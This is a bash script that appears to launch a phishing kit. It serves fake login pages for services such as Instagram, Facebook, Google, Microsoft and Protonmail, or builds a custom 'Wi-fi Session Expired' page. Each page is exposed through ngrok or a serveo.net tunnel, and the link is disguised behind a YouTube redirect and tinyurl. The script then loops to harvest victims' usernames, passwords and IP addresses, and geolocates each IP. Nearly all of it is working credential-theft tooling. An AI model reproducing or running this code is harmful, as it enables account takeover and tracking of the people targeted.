
trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {

printf " [01] Instagram                        [09] Origin                             [17] Gitlab\n"
printf " [02] Facebook                         [10] Steam                              [18] Pinterest\n"
printf " [03] Snapchat                         [11] Yahoo                              [19] Custom\n"
printf " [04] Twitter                          [12] Linkedin                           [20] Exit\n"
printf " [05] Github                           [13] Protonmail\n"
printf " [06] Google                           [14] Wordpress\n"
printf " [07] Spotify                          [15] Microsoft\n"
printf " [08] Netflix                          [16] InstaFollowers\n"
read -p $' Choose an option: ' option

if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start1

elif [[ $option == 2 || $option == 02 ]]; then
server="facebook"
start1
elif [[ $option == 3 || $option == 03 ]]; then
server="snapchat"
start1
elif [[ $option == 4 || $option == 04 ]]; then
server="twitter"
start1
elif [[ $option == 5 || $option == 05 ]]; then
server="github"
start1
elif [[ $option == 6 || $option == 06 ]]; then
server="google"
start1

elif [[ $option == 7 || $option == 07 ]]; then
server="spotify"
start1

elif [[ $option == 8 || $option == 08 ]]; then
server="netflix"
start1

elif [[ $option == 9 || $option == 09 ]]; then
server="origin"
start1

elif [[ $option == 10 ]]; then
server="steam"
start1

elif [[ $option == 11 ]]; then
server="yahoo"
start1

elif [[ $option == 12 ]]; then
server="linkedin"
start1

elif [[ $option == 13 ]]; then
server="protonmail"
start1

elif [[ $option == 14 ]]; then
server="wordpress"
start1

elif [[ $option == 15 ]]; then
server="microsoft"
start1

elif [[ $option == 16 ]]; then
server="instafollowers"
start1

elif [[ $option == 17 ]]; then
server="gitlab"
start1

elif [[ $option == 18 ]]; then
server="pinterest"
start1

elif [[ $option == 19 ]]; then
server="create"
createpage
start1

elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

banner() {
printf "                                                                                      
   SSSSSSSSSSSSSSS hhhhhhh                                 iiii   jjjj                   
 SS:::::::::::::::Sh:::::h                                i::::i j::::j                  
S:::::SSSSSS::::::Sh:::::h                                 iiii   jjjj                   
S:::::S     SSSSSSSh:::::h                                                               
S:::::S             h::::h hhhhh      rrrrr   rrrrrrrrr  iiiiiiijjjjjjj  aaaaaaaaaaaaa   
S:::::S             h::::hh:::::hhh   r::::rrr:::::::::r i:::::ij:::::j  a::::::::::::a  
 S::::SSSS          h::::::::::::::hh r:::::::::::::::::r i::::i j::::j  aaaaaaaaa:::::a 
  SS::::::SSSSS     h:::::::hhh::::::hrr::::::rrrrr::::::ri::::i j::::j           a::::a 
    SSS::::::::SS   h::::::h   h::::::hr:::::r     r:::::ri::::i j::::j    aaaaaaa:::::a 
       SSSSSS::::S  h:::::h     h:::::hr:::::r     rrrrrrri::::i j::::j  aa::::::::::::a 
            S:::::S h:::::h     h:::::hr:::::r            i::::i j::::j a::::aaaa::::::a 
            S:::::S h:::::h     h:::::hr:::::r            i::::i j::::ja::::a    a:::::a 
SSSSSSS     S:::::S h:::::h     h:::::hr:::::r           i::::::ij::::ja::::a    a:::::a 
S::::::SSSSSS:::::S h:::::h     h:::::hr:::::r           i::::::ij::::ja:::::aaaa::::::a 
S:::::::::::::::SS  h:::::h     h:::::hr:::::r           i::::::ij::::j a::::::::::aa:::a
 SSSSSSSSSSSSSSS    hhhhhhh     hhhhhhhrrrrrrr           iiiiiiiij::::j  aaaaaaaaaa  aaaa
                                                                 j::::j                  
                                                       jjjj      j::::j                  
                                                      j::::jj   j:::::j                  
                                                      j::::::jjj::::::j                  
                                                       jj::::::::::::j                   
                                                         jjj::::::jjj                    
                                                            jjjjjj    \n"
printf "                        .:.:. coded by:  @Sanskar_Chaudhary .:.:.      \n"
printf "                   Disclaimer: Developers assume no liability and are not  \n "
printf "                  responsible for any misuse or damage caused by Project  \n"
}

createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $' Title 1 (Default: Wi-fi Session Expired): ' cap1
cap1="${cap1:-${default_cap1}}"

read -p $' Title 2 (Default: Please login again.): ' cap2
cap2="${cap2:-${default_cap2}}"

read -p $' Username field (Default: Username:): ' user_text
user_text="${user_text:-${default_user_text}}"

read -p $' Password field (Default: Password:): ' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $' Submit field (Default: Log-In): ' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf " Account: %s \n" $account
printf " Password: %s \n" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf " Saved: sites/%s/saved.usernames.txt\n" $server
printf "\n"
printf " Waiting Next IP and Next Credentials, Press Ctrl + C to exit...\n"

}


catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf " Target IP: %s\n" $ip
printf " User-Agent: %s\n" $ua
printf " Saved: %s/saved.ip.txt\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "[*] Hostname: %s\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "[*] Reverse DNS: %s\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "[*] IP Continent: %s\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "[*] IP Country: %s\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "[*] State: %s\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "[*] City Location: %s\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "[*] ISP: %s\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "[*] AS Number: %s\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "[*] IP Address Speed: %s\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "[*] IP Currency: %s\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
printf " Waiting Credentials and Next IP, Press Ctrl + C to exit...\n"

}



serverx() {
printf " Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf " Starting server...\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf ' Send the direct link to target: %s \n' $send_link

send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf ' Or using tinyurl: %s \n' $send_ip
printf "\n"
checkfound


}

startx() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf ' Choose a Port (Default: %s : ' $default_port
read port
port="${port:-${default_port}}"
serverx

}


start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf " Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "[!] Download error... Termux, run: pkg install wget\n"
exit 1
fi



else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "[!] Download error... \n"
exit 1
fi
fi
fi

printf " Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf " Starting ngrok server...\n"
./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf " Send this link to the Target: %s\n" $link
send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf ' Or using tinyurl: %s \n' $send_ip
printf "\n"

checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


#printf "\n"
#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
#default_option_server="1"
#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
#option_server="${option_server:-${default_option_server}}"
#if [[ $option_server == 1 || $option_server == 01 ]]; then
#startx

#elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
#else
#printf "\e[1;93m [!] Invalid option!\e[0m\n"
#sleep 1
#clear
#start1
#fi

}
checkfound() {

printf "\n"
printf " Waiting IPs and Credentials, Press Ctrl + C to exit...\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf " IP Found!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf " Credentials Found!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5


done 

}
banner
dependencies
menu



